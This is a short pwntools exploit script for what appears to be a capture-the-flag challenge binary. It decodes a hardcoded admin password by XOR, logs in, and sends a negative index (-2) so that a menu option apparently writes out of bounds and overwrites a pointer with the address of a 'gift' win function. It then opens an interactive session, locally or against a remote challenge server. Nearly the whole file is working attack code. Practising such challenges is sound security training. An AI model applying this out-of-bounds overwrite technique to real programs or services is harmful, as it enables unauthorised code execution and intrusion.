#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or 'chall')

context.terminal = ['wt.exe','wsl.exe']

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('23.146.248.136',31480)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())


def find_pass():
    key = 0xAA
    n = 21
    data = bytearray(n)
    data[0:8] = p64(0xCED89ADDD9D9EAFA)
    data[8:16] = p64(0xDB929FC298CF92F5)
    data[13:21] = p64(0x9FDBDE93DEDB929F)
    password = xor(data, key)
    return password

p = start()

addr_win = exe.sym.gift

password = find_pass()
print(password)
p.sendline(b'admin')
p.sendline(password)
p.sendline(b'2')
p.sendline(str(-2).encode())
p.sendline(p64(addr_win))
p.sendline(str(addr_win).encode())

p.interactive()

